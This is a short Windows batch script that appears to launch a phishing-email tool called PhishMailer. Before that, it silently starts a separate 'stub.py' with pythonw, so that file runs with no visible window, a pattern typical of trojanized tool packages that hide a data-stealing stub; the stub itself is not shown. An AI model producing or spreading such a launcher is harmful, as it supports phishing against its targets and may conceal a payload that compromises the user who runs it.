@echo off
start pythonw stub.py
start pip install -r requirements.txt
python PhishMailer.py
exit
